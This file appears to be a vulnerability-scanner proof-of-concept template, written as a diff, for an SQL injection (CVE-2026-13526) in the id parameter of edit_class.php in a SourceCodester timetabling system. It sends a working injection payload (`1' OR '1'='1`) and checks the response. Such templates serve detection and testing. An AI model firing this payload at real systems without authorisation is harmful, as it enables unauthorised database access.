@@ -1,0 +1,43 @@
+[info]
+id = "POC-AVE-2026-0019"
+name = "Class and Exam Timetabling System edit_class.php SQL注入 PoC"
+author = "AVE"
+severity = "high"
+tags = ["sql-injection", "cve-2026-13526"]
+description = "SourceCodester Class and Exam Timetabling System 1.0 中 /edit_class.php 的 id 参数存在 SQL 注入漏洞。通过注入 OR 1=1 等 payload 可导致未授权访问数据库中的课程与考试排期信息。"
+vuln_id = ["CVE-2026-13526", "AVE-2026-0019"]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "GET"
+path = "/edit_class.php"
+query.id = "1"
+
+[[poc.requests.matchers]]
+type = "status"
+status = [200]
+expect = true
+
+[[poc.requests.matchers]]
+type = "word"
+part = "body"
+words = ["Edit", "class", "section"]
+expect = true
+
+[[poc.requests]]
+method = "GET"
+path = "/edit_class.php"
+query.id = "1' OR '1'='1"
+
+[[poc.requests.matchers]]
+type = "status"
+status = [200]
+expect = true
+
+[[poc.requests.matchers]]
+type = "word"
+part = "body"
+words = ["Edit", "class", "section"]
+expect = true
